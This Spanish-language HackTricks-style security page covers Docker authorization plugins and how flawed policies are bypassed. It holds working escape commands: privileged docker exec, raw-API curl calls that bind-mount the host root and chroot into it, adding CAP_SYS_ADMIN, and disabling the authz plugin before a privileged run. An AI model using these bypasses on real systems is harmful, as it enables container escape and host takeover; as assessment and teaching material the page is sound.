# Plugins de autorización en runtime

{{#include ../../../banners/hacktricks-training.md}}

## Descripción general

Los plugins de autorización en runtime son una capa adicional de políticas que decide si un caller puede realizar una acción determinada del daemon. Docker es el ejemplo clásico. Por defecto, cualquiera que pueda comunicarse con el daemon de Docker tiene, en la práctica, un control amplio sobre él. Los plugins de autorización intentan restringir este modelo examinando el usuario autenticado y la operación de API solicitada, y permitiendo o denegando la solicitud según la política.

Este tema merece su propia página porque cambia el modelo de explotación cuando un atacante ya tiene acceso a una Docker API o a un usuario del grupo `docker`. En estos entornos, la pregunta ya no es solo "¿puedo llegar al daemon?", sino también "¿el daemon está protegido por una capa de autorización y, si es así, se puede evadir mediante endpoints no gestionados, un parsing débil de JSON o permisos de administración de plugins?"

## Funcionamiento

Cuando una solicitud llega al daemon de Docker, el subsistema de autorización puede pasar el contexto de la solicitud a uno o más plugins instalados. El plugin ve la identidad del usuario autenticado, los detalles de la solicitud, determinados headers y partes del body de la solicitud o de la respuesta cuando el content type es adecuado. Se pueden encadenar varios plugins, y el acceso solo se concede si todos los plugins permiten la solicitud.

Este modelo parece sólido, pero su seguridad depende por completo de hasta qué punto el autor de la política comprendió la API. Un plugin que bloquee `docker run --privileged` pero ignore `docker exec`, no tenga en cuenta claves JSON alternativas como `Binds` en el nivel superior o permita la administración de plugins puede crear una falsa sensación de restricción y, al mismo tiempo, dejar abiertas rutas directas de privilege escalation.

## Objetivos habituales de los plugins

Las áreas importantes que deben revisarse en una política son:

- endpoints de creación de containers
- campos de `HostConfig` como `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode` y las opciones para compartir namespaces
- comportamiento de `docker exec`
- endpoints de administración de plugins
- cualquier endpoint que pueda activar indirectamente acciones de runtime fuera del modelo de políticas previsto

Históricamente, ejemplos como el plugin `authz` de Twistlock y plugins educativos sencillos como `authobot` facilitaron el estudio de este modelo porque sus archivos de políticas y rutas de código mostraban cómo se implementaba realmente el mapeo entre endpoints y acciones. Para las tareas de assessment, la lección importante es que el autor de la política debe comprender toda la superficie de la API, no solo los comandos de CLI más visibles.

## Abuso

El primer objetivo es averiguar qué está realmente bloqueado. Si el daemon deniega una acción, el error a menudo hace leak del nombre del plugin, lo que ayuda a identificar el control utilizado:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
Si necesitas un perfilado más amplio de los endpoints, herramientas como `docker_auth_profiler` son útiles porque automatizan la tarea, normalmente repetitiva, de comprobar qué rutas de la API y estructuras JSON están realmente permitidas por el plugin.

Si el entorno utiliza un plugin personalizado y puedes interactuar con la API, enumera qué campos de los objetos se filtran realmente:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Estas comprobaciones son importantes porque muchos fallos de autorización son específicos de los campos y no de los conceptos. Un plugin puede rechazar un patrón de CLI sin bloquear por completo la estructura de API equivalente.

### Ejemplo completo: `docker exec` añade privilegios después de crear el contenedor

Una política que bloquea la creación de contenedores privilegiados, pero permite crear contenedores sin restricciones y usar `docker exec`, aún puede evadirse:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
Si el daemon acepta el segundo paso, el usuario ha recuperado un proceso interactivo privilegiado dentro de un contenedor que el autor de la policy creía restringido.

### Ejemplo completo: Bind Mount mediante la Raw API

Algunas policies defectuosas inspeccionan solo una forma de JSON. Si el bind mount del sistema de archivos raíz no se bloquea de forma coherente, el host todavía puede montarse:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
La misma idea también puede aparecer en `HostConfig`:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
El impacto es un escape completo del filesystem del host. El detalle interesante es que el bypass proviene de una cobertura incompleta de la policy, no de un bug del kernel.

### Ejemplo completo: atributo de Capability no verificado

Si la policy olvida filtrar un atributo relacionado con una Capability, el atacante puede crear un container que recupere una Capability peligrosa:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
Una vez que `CAP_SYS_ADMIN` o una capability de fuerza similar está presente, muchas técnicas de escape descritas en [capabilities.md](protections/capabilities.md) y [privileged-containers.md](privileged-containers.md) pasan a estar disponibles.

### Ejemplo completo: deshabilitar el plugin

Si se permiten las operaciones de gestión de plugins, el bypass más limpio puede ser desactivar completamente el control:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
Este es un fallo de política a nivel de control-plane. La capa de autorización existe, pero el usuario al que debía restringir todavía conserva permisos para deshabilitarla.

## Comprobaciones

Estos comandos tienen como objetivo identificar si existe una capa de políticas y si parece completa o superficial.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
Qué es interesante aquí:

- Los mensajes de denegación que incluyen el nombre de un plugin confirman la existencia de una capa de autorización y a menudo revelan la implementación exacta.
- Una lista de plugins visible para el atacante puede ser suficiente para descubrir si es posible realizar operaciones de deshabilitación o reconfiguración.
- Una policy que bloquea solo las acciones CLI obvias, pero no las solicitudes API directas, debe considerarse susceptible de bypass hasta que se demuestre lo contrario.

## Valores predeterminados del runtime

| Runtime / plataforma | Estado predeterminado | Comportamiento predeterminado | Debilitamiento manual común |
| --- | --- | --- | --- |
| Docker Engine | No está habilitado de forma predeterminada | El acceso al daemon es, en la práctica, de todo o nada, a menos que se configure un plugin de autorización | policy incompleta del plugin, blacklists en lugar de allowlists, permitir la gestión de plugins, puntos ciegos a nivel de campos |
| Podman | No existe un equivalente directo común | Podman suele depender más de los permisos de Unix, la ejecución rootless y las decisiones sobre la exposición de la API que de plugins de autorización al estilo de Docker | exponer ampliamente una API de Podman rootful, permisos débiles del socket |
| containerd / CRI-O | Modelo de control diferente | Estos runtimes suelen depender de los permisos del socket, los límites de confianza del nodo y los controles del orquestador en capas superiores, en lugar de plugins de autorización de Docker | montar el socket en workloads, suposiciones débiles sobre la confianza local del nodo |
| Kubernetes | Utiliza authn/authz en las capas del API-server y kubelet, no plugins de autorización de Docker | El RBAC del cluster y los controles de admission son la principal capa de policy | RBAC demasiado permisivo, policy de admission débil, exponer directamente las API del kubelet o del runtime |

{{#include ../../../banners/hacktricks-training.md}}
